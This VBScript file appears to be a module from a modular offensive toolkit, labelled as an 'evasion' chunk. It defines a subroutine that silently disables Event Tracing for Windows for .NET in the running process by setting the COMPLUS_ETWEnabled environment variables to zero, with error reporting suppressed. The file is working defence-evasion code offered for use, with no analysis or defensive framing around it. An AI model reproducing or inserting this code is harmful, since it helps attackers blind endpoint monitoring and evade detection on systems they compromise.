' chunk: evasion/etw_disable
' depends: (none)
' provides: disable_etw
' format: vbscript
' note: Disable ETW tracing via process environment variable

Sub disable_etw()
    On Error Resume Next
    Dim sh, env
    Set sh = CreateObject("WScript.Shell")
    Set env = sh.Environment("Process")
    env("COMPLUS_ETWEnabled") = "0"
    env("COMPlus_ETWEnabled") = "0"
End Sub
